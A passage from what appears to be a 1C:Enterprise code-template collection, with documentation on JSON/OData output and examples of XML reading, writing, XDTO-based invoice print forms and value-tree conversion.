	""Поставщик_Key"":guid'd1cb82a7-8e8b-11db-a9b0-00055d49b45e',
	""Поставщик@navigationLinkUrl"":""СправочникДляТестов(guid'cc6a7df3-8cfe-11dc-8ca0-000d8843cd1b')/Поставщик"",
	""РеквизитХранилище_Type"": ""image/jpeg"",
	""РеквизитХранилище_Base64Data@mediaReadLink"": ""Catalog_ДемоСправочник(guid'cf2b1a24-1b96-11e3-8f11-5404a6a68c42')/РеквизитХранилище_Base64Data"",
	""РеквизитХранилище_Base64Data"": <строка с закодированными данными>
	…
},
{…},
{…}
]
}
Вы можете управлять объёмом передаваемой информации за счёт изменения детальности представления метаданных в выгрузке. Существуют три уровня: Nometadata, Minimalmetadata и Fullmetadata. По-умолчанию (на примере вверху) используется средний уровень - Minimalmetadata. На уровне Nometadata объём передаваемой информации минимальный, а на уровне Fullmetadata - максимальный. Однако при этом нужно понимать, что сокращение объёма передаваемой информации приводит к более интенсивным вычислениям на клиенте. И наоборот, когда вся информация включается в выгрузку, объём вычислений на клиенте будет минимальным.

Детальность представления метаданных вы можете указать, например, в адресной строке.

Сведения о метаданных не передаются:

GET /TestInfobase/odata/standard.odata/СправочникДляТестов/?$format=application/json;odata= minimalmetadata
Вся информация о метаданных включается в выгрузку:

GET /TestInfobase/odata/standard.odata/СправочникДляТестов/?$format=application/json;odata=fullmetadata
HTTP-сервисы прикладного решения
HTTP-сервисы, реализованные в прикладном решении, также могут возвращать ответ в формате JSON. Для этого вам проще всего сформировать тело ответа в JSON, получить его как строку, а затем установить из этой строки тело HTTP ответа сервиса. При этом желательно указать, что BOM (Byte Order Mark, метка порядка байтов) использоваться не должна.


Последний параметр (ИспользованиеByteOrderMark.НеИспользовать) вы можете и не указывать, если режим совместимости конфигурации не установлен, или он больше чем Версия8_3_5. Потому что в этом случае BOM автоматически будет использоваться только для кодировок UTF-16 и UTF-32, а для UTF-8, UTF-16LE/UTF-16BE, UTF-32LE/UTF-32BE и других она использоваться не будет.

Взаимодействие со сторонними HTTP сервисами
При взаимодействии со сторонними HTTP интерфейсами у вас также может возникнуть необходимость формирования запросов к ним в формате JSON. В этом случае алгоритм ваших действий будет аналогичным. Формируете тело запроса в JSON. Получаете тело в виде строки. Из этой строки устанавливаете тело HTTP запроса. BOM не используете.


Дальнейшее развитие
Мы думаем над тем, чтобы предоставить вам возможность сериализации в JSON прикладных типов 1С:Предприятия: ссылок, объектов, наборов записей и т.д. Поэтому есть вероятность появления ещё одного, третьего уровня средств работы с JSON. Этот уровень позволит вам преобразовывать в JSON любые типы 1С:Предприятия, для которых поддерживается XDTO-сериализация в XML."}
}
},
{6,
{"XML",1,0,"",""},
{0,
{"XML",0,0,"","&НаКлиенте
Процедура Выгрузить(ПутьКФайлу)
    //ПутьКФайлу = ""D:\1c.xml""; 
    Сериализатор = Новый СериализаторXDTO(ФабрикаXDTO);
    ЗаписьXML = Новый ЗаписьXML;
    ЗаписьXML.ОткрытьФайл(ПутьКФайлу);
    //XML.УстановитьСтроку();
    Сериализатор.ЗаписатьXML(ЗаписьXML, <?""Таблица (напр., Объект.ДанныеВход)"">);
    СтрокаXML = ЗаписьXML.Закрыть();
КонецПроцедуры

&НаСервере
Функция ЗагрузитьЗначенияНаСервере(ПутьКФайлу)
    //ПутьКФайлу = ""D:\1c.xml"";
    ЧтениеXML = Новый ЧтениеXML;
    ЧтениеXML.ОткрытьФайл(ПутьКФайлу);
    Сериализатор = Новый СериализаторXDTO(ФабрикаXDTO);
    Результат = Сериализатор.ПрочитатьXML(ЧтениеXML);
    РезультатЗначение = ДанныеФормыВЗначение(Результат, Тип(""ТаблицаЗначений""));
    <?""Таблица (напр., Объект.ДанныеВход)"">.Загрузить(РезультатЗначение);
    ЧтениеXML.Закрыть();
КонецФункции"}
},
{0,
{"ЧтениеXMLВДерево",0,0,""," 
 // Чтение XML
 
 &НаСервере
 Функция ЧтениеXMLВДерево(Путь)
	 
	 Дерево = Новый ДеревоЗначений;
	 Дерево.Колонки.Добавить(""Имя"");
	 Дерево.Колонки.Добавить(""Значение"");
	 
	 XMLФайл = Новый ЧтениеXML;
	 XMLФайл.ОткрытьФайл(Путь);
	 
	 ПрочитатьXMLПоТегам(XMLФайл, Дерево.Строки);
	 
	 XMLФайл.Закрыть();
	 
	 Возврат Дерево;
	 
 КонецФункции
 
 &НаСервереБезКонтекста
 Процедура ПрочитатьXMLПоТегам(XMLФайл, ТекущийНаборСтрок)
	 
	 Пока XMLФайл.Прочитать() Цикл
		 Если XMLФайл.ТипУзла = ТипУзлаXML.НачалоЭлемента Тогда
			 
			 НоваяСтрока = ТекущийНаборСтрок.Добавить();
			 НоваяСтрока.Имя = XMLФайл.Имя;
			 НоваяСтрока.Значение = """";
			 
			 Пока XMLФайл.ПрочитатьАтрибут() Цикл
				 
				 НоваяСтрокаАтрибут = НоваяСтрока.Строки.Добавить();
				 НоваяСтрокаАтрибут.Имя = XMLФайл.Имя;
				 НоваяСтрокаАтрибут.Значение = СокрЛП(XMLФайл.Значение);
				 
			 КонецЦикла;
			 
			 ПрочитатьXMLПоТегам(XMLФайл, НоваяСтрока.Строки);
			 
		 ИначеЕсли XMLФайл.ТипУзла = ТипУзлаXML.КонецЭлемента Тогда
			 Возврат;
		 ИначеЕсли XMLФайл.ТипУзла = ТипУзлаXML.Текст Тогда
			 
			 ТекущийНаборСтрок.Родитель.Значение = СокрЛП(XMLФайл.Значение);
			 
		 Иначе
			 Сообщить(""Тип узла: "" + XMLФайл.ТипУзла + "" НЕ ОБРАБОТАН"", СтатусСообщения.Важное);
		 Конецесли;
	 КонецЦикла;
	 
 КонецПроцедуры
 
 "}
},
{0,
{"ПрочитатьФайлXML",0,0,"","/// Как прочитать файл в формате XML через DOM
/// в 1с 8.3, 8.2
 
&НаСервере
Процедура ПрочитатьФайлXMLЧерезDOM(ПутьКФайлу)
 
    // Разбор документа через DOM (document object model)
    // https://ru.wikipedia.org/wiki/Document_Object_Model
 
    // Разбираем файл test.xml, ссылка на его скачивание выше.
 
    Парсер = Новый ЧтениеXML;
    Парсер.ОткрытьФайл(ПутьКФайлу);
 
    Построитель = Новый ПостроительDOM;
 
    Документ = Построитель.Прочитать(Парсер);
 
    Для Каждого Элемент0 Из Документ.ЭлементДокумента.ДочерниеУзлы Цикл
        Если Элемент0.ИмяУзла = ""Страна"" Тогда
            Страна = Элемент0;
 
            Название = Страна.Атрибуты.ПолучитьИменованныйЭлемент(""Название"");
            Если Название <> Неопределено Тогда
                Сообщить(""== "" + Название.Значение + "" =="");
            КонецЕсли;
 
            Численность = Страна.Атрибуты.ПолучитьИменованныйЭлемент(""Численность"");
            Если Численность <> Неопределено Тогда
                Сообщить(""Численность: "" + Численность.Значение);
            КонецЕсли;
 
            Столица = Страна.Атрибуты.ПолучитьИменованныйЭлемент(""Столица"");
            Если Столица <> Неопределено Тогда
                Сообщить(""Столица: "" + Столица.Значение);
            КонецЕсли;
 
            Для Каждого Элемент1 Из Страна.ДочерниеУзлы Цикл
                Если Элемент1.ИмяУзла = ""ТрадиционныеБлюда"" Тогда
                    ТрадиционныеБлюда = Элемент1;
 
                    Сообщить(""Традиционные блюда:"");
 
                    Для Каждого Элемент2 Из ТрадиционныеБлюда.ДочерниеУзлы Цикл
                        Если Элемент2.ИмяУзла = ""Блюдо"" Тогда
                            Блюдо = Элемент2;
 
                            Название = Блюдо.Атрибуты.ПолучитьИменованныйЭлемент(""Название"");
                            Если Название <> Неопределено Тогда
                                Сообщить("" "" + Название.Значение);
                            КонецЕсли;
                        КонецЕсли;
                    КонецЦикла;                    
                ИначеЕсли Элемент1.ИмяУзла = ""ОбщееОписание"" Тогда
                    Сообщить(""Общее описание:"");
                    Сообщить(Элемент1.ТекстовоеСодержимое);
                КонецЕсли;                
            КонецЦикла;
        КонецЕсли;
    КонецЦикла;
 
    Парсер.Закрыть();
 
КонецПроцедуры
 
/// Как прочитать файл в формате XML последовательно
/// (способ 1) в 1с 8.3, 8.2
 
&НаСервере
Процедура ПрочитатьФайлXMLПоследовательноСпособ1(ПутьКФайлу)
 
    // Этот способ подойдёт для очень больших файлов,
    // для которых модель DOM неприменима.
 
    // Способ 1.
 
    // Разбираем файл test.xml, ссылка на его скачивание выше.
 
    Парсер = Новый ЧтениеXML;
    Парсер.ОткрытьФайл(ПутьКФайлу);
 
    Пока Парсер.Прочитать() Цикл
        Если 
            Парсер.ТипУзла = ТипУзлаXML.НачалоЭлемента И
            Парсер.Имя = ""Страна""
        Тогда
            Название = Парсер.ЗначениеАтрибута(""Название"");
            Если Название <> Неопределено Тогда
                Сообщить(""== "" + Название + "" =="");
            КонецЕсли;
 
            Численность = Парсер.ЗначениеАтрибута(""Численность"");
            Если Численность <> Неопределено Тогда
                Сообщить(""Численность: "" + Численность);
            КонецЕсли;
 
            Столица = Парсер.ЗначениеАтрибута(""Столица"");
            Если Столица <> Неопределено Тогда
                Сообщить(""Столица: "" + Столица);
            КонецЕсли;
 
            Пока Парсер.Прочитать() Цикл // <Страна>
                Если 
                    Парсер.ТипУзла = ТипУзлаXML.НачалоЭлемента И
                    Парсер.Имя = ""ТрадиционныеБлюда""
                Тогда                    
                    Сообщить(""Традиционные блюда:"");
 
                    Пока Парсер.Прочитать() Цикл // <ТрадиционныеБлюда>
                        Если 
                            Парсер.ТипУзла = ТипУзлаXML.НачалоЭлемента И
                            Парсер.Имя = ""Блюдо"" 
                        Тогда
                            Название = Парсер.ЗначениеАтрибута(""Название"");
                            Если Название <> Неопределено Тогда
                                Сообщить("" "" + Название);
                            КонецЕсли;
                        ИначеЕсли
                            Парсер.ТипУзла = ТипУзлаXML.КонецЭлемента И
                            Парсер.Имя = ""ТрадиционныеБлюда""
                        Тогда
                            Прервать;
                        КонецЕсли;
                    КонецЦикла; //  </ТрадиционныеБлюда>
 
                ИначеЕсли
                    Парсер.ТипУзла = ТипУзлаXML.НачалоЭлемента И
                    Парсер.Имя = ""ОбщееОписание""
                Тогда                
                    Парсер.Прочитать();
                    Если Парсер.ТипУзла = ТипУзлаXML.Текст Тогда
                        Сообщить(""Общее описание:"");
                        Сообщить(Парсер.Значение);
                    КонецЕсли;                
                ИначеЕсли
                    Парсер.ТипУзла = ТипУзлаXML.КонецЭлемента И
                    Парсер.Имя = ""Страна""
                Тогда
                    Прервать;
                КонецЕсли;
            КонецЦикла; // </Страна>
 
        КонецЕсли;
    КонецЦикла;
 
    Парсер.Закрыть();
 
КонецПроцедуры
 
/// Как прочитать файл в формате XML последовательно
/// (способ 2) в 1с 8.3, 8.2
 
&НаСервере
Процедура ПрочитатьФайлXMLПоследовательноСпособ2(ПутьКФайлу)
 
    // Этот способ подойдёт для очень больших файлов,
    // для которых модель DOM неприменима.
 
    // Способ 2.
 
    // Разбираем файл test.xml, ссылка на его скачивание выше.
 
    Парсер = Новый ЧтениеXML;
    Парсер.ОткрытьФайл(ПутьКФайлу);
 
    СтекИмен = Новый СписокЗначений;
 
    Пока Парсер.Прочитать() Цикл
        Если Парсер.ТипУзла = ТипУзлаXML.НачалоЭлемента Тогда
            СтекИмен.Добавить(Парсер.Имя);
            ПолныйПуть = ПостроитьПуть(СтекИмен);
 
            Если ПолныйПуть = ""/Страны/Страна"" Тогда
                Название = Парсер.ЗначениеАтрибута(""Название"");
                Если Название <> Неопределено Тогда
                    Сообщить(""== "" + Название + "" =="");
                КонецЕсли;
 
                Численность = Парсер.ЗначениеАтрибута(""Численность"");
                Если Численность <> Неопределено Тогда
                    Сообщить(""Численность: "" + Численность);
                КонецЕсли;
 
                Столица = Парсер.ЗначениеАтрибута(""Столица"");
                Если Столица <> Неопределено Тогда
                    Сообщить(""Столица: "" + Столица);
                КонецЕсли;
            ИначеЕсли ПолныйПуть = ""/Страны/Страна/ТрадиционныеБлюда"" Тогда
                Сообщить(""Традиционные блюда:"");
            ИначеЕсли ПолныйПуть = ""/Страны/Страна/ТрадиционныеБлюда/Блюдо"" Тогда
                Название = Парсер.ЗначениеАтрибута(""Название"");
                Если Название <> Неопределено Тогда
                    Сообщить("" "" + Название);
                КонецЕсли;
            ИначеЕсли ПолныйПуть = ""/Страны/Страна/ОбщееОписание"" Тогда
                Парсер.Прочитать();
                Если Парсер.ТипУзла = ТипУзлаXML.Текст Тогда
                    Сообщить(""Общее описание:"");
                    Сообщить(Парсер.Значение);
                КонецЕсли;
            КонецЕсли;
        ИначеЕсли Парсер.ТипУзла = ТипУзлаXML.КонецЭлемента Тогда
            СтекИмен.Удалить(СтекИмен.Количество() - 1);
        КонецЕсли;
    КонецЦикла;
 
    Парсер.Закрыть();
 
КонецПроцедуры
 
/// Как записать данные в файл формата XML в 1с 8.3, 8.2
 
&НаКлиенте
Процедура ЗаписатьДанныеВФорматеXML(ПутьКФайлуДляЗаписи)
 
    // Предположим, что у нас есть данные о странах,
    // которые нужно записать во внешний файл в формате XML.    
 
    Страны = СоздатьДанныеДляЗаписиВXML();    
 
    // И эти данные хранятся во списке значений Страны,
    // который нам вернула внутренняя процедура (определена
    // ниже).
 
    ЗаписьXML = Новый ЗаписьXML;
 
    ЗаписьXML.ОткрытьФайл(ПутьКФайлуДляЗаписи);
 
    ЗаписьXML.ЗаписатьОбъявлениеXML();    
 
    ЗаписьXML.ЗаписатьНачалоЭлемента(""Страны"");
 
    Для Каждого Страна Из Страны Цикл
        ЗаписьXML.ЗаписатьНачалоЭлемента(""Страна"");
        ЗаписьXML.ЗаписатьАтрибут(""Название"", Страна.Значение.Название);
        ЗаписьXML.ЗаписатьАтрибут(""Численность"", Страна.Значение.Численность);
        ЗаписьXML.ЗаписатьАтрибут(""Столица"", Страна.Значение.Столица);
 
        ЗаписьXML.ЗаписатьНачалоЭлемента(""ТрадиционныеБлюда"");
        Для Каждого Блюдо Из Страна.Значение.ТрадиционныеБлюда Цикл
            ЗаписьXML.ЗаписатьНачалоЭлемента(""Блюдо"");
            ЗаписьXML.ЗаписатьАтрибут(""Название"", Блюдо.Значение.Название);
            ЗаписьXML.ЗаписатьКонецЭлемента(); // Блюдо
        КонецЦикла;
        ЗаписьXML.ЗаписатьКонецЭлемента(); // ТрадиционныеБлюда
 
        ЗаписьXML.ЗаписатьНачалоЭлемента(""ОбщееОписание"");
        ЗаписьXML.ЗаписатьТекст(Страна.Значение.ОбщееОписание);
        ЗаписьXML.ЗаписатьКонецЭлемента(); // ОбщееОписание
 
        ЗаписьXML.ЗаписатьКонецЭлемента(); // Страна
    КонецЦикла;
 
    ЗаписьXML.ЗаписатьКонецЭлемента(); // Страны
 
    ЗаписьXML.Закрыть();
 
КонецПроцедуры
 
&НаКлиенте
Функция СоздатьДанныеДляЗаписиВXML()
 
    Страны = Новый СписокЗначений;
 
    Россия = Новый Структура(""Название, Численность, Столица, ТрадиционныеБлюда, ОбщееОписание"");
    Россия.Название = ""Россия"";
    Россия.Численность = ""144000000"";
    Россия.Столица = ""Москва"";
    Россия.ТрадиционныеБлюда = Новый СписокЗначений;
    Россия.ТрадиционныеБлюда.Добавить(Новый Структура(""Название"", ""Щи""));
    Россия.ТрадиционныеБлюда.Добавить(Новый Структура(""Название"", ""Солянка""));
    Россия.ТрадиционныеБлюда.Добавить(Новый Структура(""Название"", ""Рассольник""));
    Россия.ОбщееОписание = ""Страна с очень"" + Символы.ПС + ""большой территорией"";    
    Страны.Добавить(Россия);
 
    Китай = Новый Структура(""Название, Численность, Столица, ТрадиционныеБлюда, ОбщееОписание"");
    Китай.Название = ""Китай"";
    Китай.Численность = ""1357000000"";
    Китай.Столица = ""Пекин"";
    Китай.ТрадиционныеБлюда = Новый СписокЗначений;
    Китай.ТрадиционныеБлюда.Добавить(Новый Структура(""Название"", ""Свинина в кисло-сладком соусе""));
    Китай.ТрадиционныеБлюда.Добавить(Новый Структура(""Название"", ""Курица гунбао""));
    Китай.ТрадиционныеБлюда.Добавить(Новый Структура(""Название"", ""Мапо тофу""));
    Китай.ОбщееОписание = ""Страна с очень"" + Символы.ПС + ""большим населением."";
    Страны.Добавить(Китай);
 
    Возврат Страны;
 
КонецФункции
 
&НаСервере
Функция ПостроитьПуть(СтекИмен)
    Путь = """";
 
    Для Каждого Имя Из СтекИмен Цикл
        Путь = Путь + ""/"" + Имя;
    КонецЦикла;
 
    Возврат Путь;
КонецФункции"}
},
{0,
{"ИСПОЛЬЗОВАНИЕ XML-СЕРИАЛИЗАЦИИ",0,0,"","// Выгрузка ХОбъекта в XML-строку:
Функция ЗаписатьВXML(ХОбъект)
	ЗаписьXML 	= Новый ЗаписьXML;                            // Тонкий клиент, сервер, толстый клиент, внешнее соединение.
	ЗаписьXML.УстановитьСтроку();
	ЗаписатьXML(ЗаписьXML, ХОбъект);                      // Сервер, толстый клиент, внешнее соединение.
	Возврат ЗаписьXML.Закрыть();
КонецФункции

// Загрузка ХОбъекта из XML-строки:
Функция ПрочитатьИзXML(СтрокаXML)
	ЧтениеXML 	= Новый ЧтениеXML;                           // Тонкий клиент, сервер, толстый клиент, внешнее соединение.
	ЧтениеXML.УстановитьСтроку(СтрокаXML);
	ХОбъект 	= ПрочитатьXML(ЧтениеXML);                 // Сервер, толстый клиент, внешнее соединение.
	Возврат ХОбъект;
КонецФункции"}
},
{0,
{"Загружая схему из макета",0,0,"","Функция ПолучитьПечатнуюФорму(пПутьКФайлу = """")
	
	//+++ АйТи Кучеров Р.М. 11.10.2019 ТЗ № 0К00-004175 >> e1cib/data/Документ.ЗаданиеНаРаботу?ref=a4e232336337376211e9ea6e920e5801
	Если ПустаяСтрока(пПутьКФайлу) Тогда			   
		ТекущаяСтрока 	= ЭлементыФормы.СписокЭД.ТекущаяСтрока;
		Структура 		= ИмяФайлаXML();
	Иначе
		Структура 		= ИмяФайлаXML(пПутьКФайлу);
	КонецЕсли;
	//--- АйТи Кучеров Р.М. 11.10.2019 ТЗ № 0К00-004175 >> e1cib/data/Документ.ЗаданиеНаРаботу?ref=a4e232336337376211e9ea6e920e5801
	
	ИмяФайлаXML = Структура.ИмяФайлаИзначальное;
	Если ИмяФайлаXML = Неопределено Тогда
		Сообщить(""Ошибка сохранения XML-документа. Возможно, документ еще не распакован. Попробуйте снова, либо убедитесь, что документ, присланный вам, - """"Счет на оплату"""""");
		Возврат Неопределено;
	КонецЕсли; 	
	Если Найти(ИмяФайлаXML, ""SCHET"") <> 0 Тогда
		
		ТипДокумента = ""СчетНаОплату"";
		
	ИначеЕсли Найти(ИмяФайлаXML, ""ACCOUNTS"") <> 0  Тогда
		
		ТипДокумента = ""АктСверки"";
		
	Иначе
		
		ОбщегоНазначенияКлиентСервер.СообщитьПользователю(""Произвольный документ не является счетом на оплату. Если необходимо распечатать этот документ - обратитесь в обслуживающую организацию"");
		Возврат Неопределено;
		
	КонецЕсли;
	
	ЧтениеТекста = Новый ЧтениеТекста(Структура.ПутьКФайлу, КодировкаТекста.Ansi);
	//ЧтениеТекста = Новый ЧтениеТекста(""D:\Handling\ДО\Акты сверки\ДС 204\ON_ACCOUNTS___20180706_df69b610-e0a4-474d-bcd5-ef1222719582.xml"", КодировкаТекста.Ansi);
	СтрокаXML = ЧтениеТекста.Прочитать();
	Если ТипДокумента = ""СчетНаОплату"" Тогда
		СтрокаXML = СтрЗаменить(СтрокаXML, ""<Файл"" ,""<Файл xmlns=""""it_on_schet"""" "");
	ИначеЕсли  ТипДокумента = ""АктСверки"" Тогда
		СтрокаXML = СтрЗаменить(СтрокаXML, ""<Файл"" ,""<Файл xmlns=""""it_on_accounts"""" "");
	КонецЕсли;
	ЧтениеXML = Новый ЧтениеXML;
	ЧтениеXML.УстановитьСтроку(СтрокаXML);
	Если ТипДокумента = ""СчетНаОплату"" Тогда
		Макет = ПолучитьМакет(""it_on_schet"");
	ИначеЕсли  ТипДокумента = ""АктСверки"" Тогда
		Макет = ПолучитьМакет(""it_on_accounts"");
	КонецЕсли;
	
	ЧтениеXMLСхемы = Новый ЧтениеXML;
	ЧтениеXMLСхемы.УстановитьСтроку(Макет.ПолучитьТекст());
	ПостроительDOM = Новый ПостроительDOM;
	ДокументDOM = ПостроительDOM.Прочитать(ЧтениеXMLСхемы);
	ПостроительСхемXML = Новый ПостроительСхемXML;
	СхемаXML = ПостроительСхемXML.СоздатьСхемуXML(ДокументDOM);
	НаборСхемXML = Новый НаборСхемXML;
	НаборСхемXML.Добавить(СхемаXML);
	
	СвояФабрикаXDTO = Новый ФабрикаXDTO(НаборСхемXML);
	Если ТипДокумента = ""СчетНаОплату"" Тогда
		ТипСчетНаОплатуXDTO = СвояФабрикаXDTO.Тип(""it_on_schet"",""Файл""); //""it_on_schet"" схема в макете
		xdtoЧтениеФайла = СвояФабрикаXDTO.ПрочитатьXML(ЧтениеXML, ТипСчетНаОплатуXDTO);
	ИначеЕсли  ТипДокумента = ""АктСверки"" Тогда
		ТипАктаСверкиXDTO = СвояФабрикаXDTO.Тип(""it_on_accounts"",""Файл""); //""it_on_accounts"" схема в макете
		xdtoЧтениеФайла = СвояФабрикаXDTO.ПрочитатьXML(ЧтениеXML, ТипАктаСверкиXDTO);
	КонецЕсли;
		
	ВерсияФормата = ?(ЗначениеЗаполнено(xdtoЧтениеФайла.ВерсФорм), xdtoЧтениеФайла.ВерсФорм, xdtoЧтениеФайла.ВерсияФормата);
	
	Документ = xdtoЧтениеФайла.Документ;
	//+++ АйТи Веревкин К.А. 29012019
	Если Документ = Неопределено И ТипДокумента = ""АктСверки"" Тогда
		
		Документ = xdtoЧтениеФайла.Взаиморасчеты;		
		
	КонецЕсли;
	//--- АйТи Веревкин К.А. 29012019
	
	ИдентификаторЭД		= Строка(ТекущаяСтрока.ФайлXML);
	ОтправленоОтКогоЭЦП	= ТекущаяСтрока.КомуВыданСертефикат;
	
	Разделитель = "","";
	Строки = СтрЗаменить(ОтправленоОтКогоЭЦП, Разделитель, Символы.ПС);
	
	Если СтрЧислоСтрок(Строки) > 0 Тогда
		ОтКого = СтрПолучитьСтроку(Строки, 1);	
		ДолжностьОтКого = СтрПолучитьСтроку(Строки, 2);
	Иначе	
		ОтКого = """";
	КонецЕсли;
	
	СтруктураПараметров = Новый Структура;
	СтруктураПараметров.Вставить(""ИдентификаторЭД"", ИдентификаторЭД);
	СтруктураПараметров.Вставить(""ОтправленоОтКогоЭЦП"", ТекущаяСтрока.КомуВыданСертефикат);
	СтруктураПараметров.Вставить(""ОтКого"", ОтКого);
	СтруктураПараметров.Вставить(""ДанныеДокумента"", Документ);
	СтруктураПараметров.Вставить(""ВерсияФормата"", ВерсияФормата);
	СтруктураПараметров.Вставить(""ДолжностьОтКого"", ДолжностьОтКого);
	
	Если ТипДокумента = ""СчетНаОплату"" Тогда
		
		ТабДок = ПолучитьТабДокСчетаНаОплату(СтруктураПараметров);
		
	ИначеЕсли ТипДокумента = ""АктСверки"" Тогда
		
		ТабДок = ПолучитьТабДокАктаСверки(СтруктураПараметров);
		
	КонецЕсли;
		
	Если ТабДок = Неопределено Тогда
		Возврат Неопределено;
	КонецЕсли;
	
	ТабДок.ОтображатьСетку = Ложь; 
	ТабДок.Защита = Ложь; 
	ТабДок.ТолькоПросмотр = Ложь; 
	ТабДок.ОтображатьЗаголовки = Ложь;
	
	Возврат ТабДок;	
	
КонецФункции

Функция ИмяФайлаXML(пПутьКФайлу = """")
	
	//+++ АйТи Кучеров Р.М. 11.10.2019 ТЗ № 0К00-004175 >> e1cib/data/Документ.ЗаданиеНаРаботу?ref=a4e232336337376211e9ea6e920e5801
	Если ПустаяСтрока(пПутьКФайлу) Тогда			   
		ТекСтрока 	= ЭлементыФормы.СписокЭД.ТекущаяСтрока;
		ДанныеФайла = ЭлектронныеДокументыСлужебныйВызовСервера.ПолучитьДанныеФайла(ТекСтрока.ФайлXML, ТекСтрока.УникальныйИД);
	Иначе
		Структ 	= Новый Структура(""ИмяФайлаИзначальное, ПутьКФайлу"", ""ACCOUNTS"", пПутьКФайлу); //Для отладки
		Возврат Структ;
	КонецЕсли;
	//--- АйТи Кучеров Р.М. 11.10.2019 ТЗ № 0К00-004175 >> e1cib/data/Документ.ЗаданиеНаРаботу?ref=a4e232336337376211e9ea6e920e5801
	 
	//РабочийКаталогПользователя = ФайловыеФункцииСлужебныйКлиент.РабочийКаталогПользователя();
	//ПолноеИмяФайлаНаКлиенте = РабочийКаталогПользователя + ДанныеФайла.ОтносительныйПуть + ДанныеФайла.ИмяФайла;
	//ФайлМожноОткрывать = ПолучитьФайлВРабочийКаталог(
	//ДанныеФайла.СсылкаНаДвоичныеДанныеФайла,
	//ДанныеФайла.ОтносительныйПуть,
	//ДанныеФайла.ДатаМодификацииУниверсальная,
	//ДанныеФайла.ИмяФайла,
	//РабочийКаталогПользователя,
	//ПолноеИмяФайлаНаКлиенте);
	
	Структ = Новый Структура(""ИмяФайлаИзначальное, ПутьКФайлу"", ДанныеФайла.ИмяФайла);
	Попытка
		ДвоичныеДанные = ПолучитьИзВременногоХранилища(ДанныеФайла.СсылкаНаДвоичныеДанныеФайла);
		Имя = ПолучитьИмяВременногоФайла(""xml"");
		ДвоичныеДанные.Записать(Имя);
		ФайлМожноОткрывать = Истина;
		Структ.ПутьКФайлу = Имя;
	Исключение
		ФайлМожноОткрывать = Ложь;
	КонецПопытки;
	Если ФайлМожноОткрывать Тогда
		Возврат Структ;
	Иначе
		Возврат Неопределено;
	КонецЕсли; 
	
КонецФункции

Процедура ЗагрузитьФайлXMLНажатие(Элемент)
	
	Диалог 			= Новый ДиалогВыбораФайла(РежимДиалогаВыбораФайла.Открытие);
	Диалог.Фильтр 	= ""Файл xml (*.xml)|*.xml"";
	Диалог.Заголовок 	= ""Выберите файл xml"";
	Диалог.МножественныйВыбор 	= Ложь;
	Если Диалог.Выбрать() Тогда
		
		//лФайл = Новый ТекстовыйДокумент;
		//лФайл.Прочитать(Диалог.ПолноеИмяФайла);
		
		ПечатнаяФорма 	= ПолучитьПечатнуюФорму(Диалог.ПолноеИмяФайла);
		
	КонецЕсли;
	
КонецПроцедуры"}
},
{0,
{"Диалог выбора XML (ЗагрузитьФайлXML)",0,0,"","Процедура ЗагрузитьФайлXMLНажатие(Элемент)
	
	Диалог 			= Новый ДиалогВыбораФайла(РежимДиалогаВыбораФайла.Открытие);
	Диалог.Фильтр 	= ""Файл xml (*.xml)|*.xml"";
	Диалог.Заголовок 	= ""Выберите файл xml"";
	Диалог.МножественныйВыбор 	= Ложь;
	Если Диалог.Выбрать() Тогда
		
		//лФайл = Новый ТекстовыйДокумент;
		//лФайл.Прочитать(Диалог.ПолноеИмяФайла);
		
		ПечатнаяФорма 	= ПолучитьПечатнуюФорму(Диалог.ПолноеИмяФайла);
		
	КонецЕсли;
	
КонецПроцедуры"}
}
},
{6,
{"Дерево значений",1,0,"",""},
{2,
{"ТЗ в ДеревоЗначений",1,0,"",""},
{0,
{"Через УникальныйИдентификатор (глобальная целостность)",0,0,"","////////////////////////////////////////////////////////////////////////////////
// 1С 8.3 : Дерево значений в таблицу значений или в табличную часть и обратно
// //https://helpf.pro/faq83/view/1588.html
////////////////////////////////////////////////////////////////////////////////

//ФОРМИРОВАНИЕ ТАБЛИЦЫ ИЗ ДЕРЕВА
&НаСервере
Процедура ДеревоВТаблицу(ДокОбъект, ДеревоЗначений, НаименованиеТабличнойЧастиДокумента, СтрокаДерева = Неопределено, КлючСвязи = Неопределено) Экспорт
	
	Если СтрокаДерева = Неопределено И КлючСвязи = Неопределено Тогда
		//ПЕРВЫЙ ВЫЗОВ ПРОЦЕДУРЫ (КОРНЕВЫЕ ЭЛЕМЕНТЫ)
		ПервыйВызов 	= Истина;
		ДокОбъект[НаименованиеТабличнойЧастиДокумента].Очистить();
		ИсточникВыборки = ДеревоЗначений.Строки;
		КлючСвязи 		= Новый УникальныйИдентификатор(""00000000-0000-0000-0000-000000000000""); // ЭЛЕМЕНТ ВЕРХНЕГО УРОВНЯ ИМЕЕТ НОМЕР СТРОКИ РОДИТЕЛЯ 0 (ОБЯЗАТЕЛЬНЫЙ РЕКВИЗИТ)
	Иначе
		//ВНУТРЕННИЙ ВЫЗОВ ПРОЦЕДУРЫ (ПОДЧИНЕННЫЕ ЭЛЕМЕНТЫ)
		ПервыйВызов 	= Ложь;
		ИсточникВыборки = СтрокаДерева.Строки;
	КонецЕсли;
	
	Для каждого Стр из ИсточникВыборки Цикл
		
		НС 	= ДокОбъект[НаименованиеТабличнойЧастиДокумента].Добавить();
		лМетаданныеТЧ 	= ДокОбъект.Метаданные().ТабличныеЧасти[НаименованиеТабличнойЧастиДокумента];
		
		ЗаполнитьЗначенияСвойств(НС, Стр);
		
		НС.КлючСвязи 	= КлючСвязи;
		
		лСтрКоличество 	= Стр.Строки.Количество();
		Если лСтрКоличество > 0 Тогда
			НС.Количество 	= лСтрКоличество;
			Стр.Количество 	= лСтрКоличество;
		КонецЕсли;
		
		//Для каждого Кол из лМетаданныеТЧ.Реквизиты Цикл
		//	Если Кол.Имя = ""КлючСвязи"" Тогда
		//		НС.КлючСвязи = КлючСвязи;
		//	ИначеЕсли Кол.Имя = ""НомерСтроки"" Тогда
		//		Продолжить;
		//	Иначе 
		//		ЗаполнитьЗначенияСвойств(НС, Стр);
		//		//НС[Кол.Имя] = Стр[Кол.Имя];
		//	КонецЕсли;
		//КонецЦикла;
		Если НЕ Стр.Строки.Количество() = 0 Тогда
			ДеревоВТаблицу(ДокОбъект,,НаименованиеТабличнойЧастиДокумента, Стр, НС.ЭлементИД);
		КонецЕсли;
		
	КонецЦикла;
	
КонецПроцедуры 

//ФОРМИРОВАНИЕ ДЕРЕВА ИЗ ТАБЛИЦЫ
&НаСервере
Функция ТаблицаВДерево(ДокОбъект, НаименованиеТабличнойЧастиДокумента, КлючСвязи = Неопределено, ЭлементРодитель = Неопределено) Экспорт	
	//ПОДГОТОВКА КОЛОНОК ДЕРЕВА
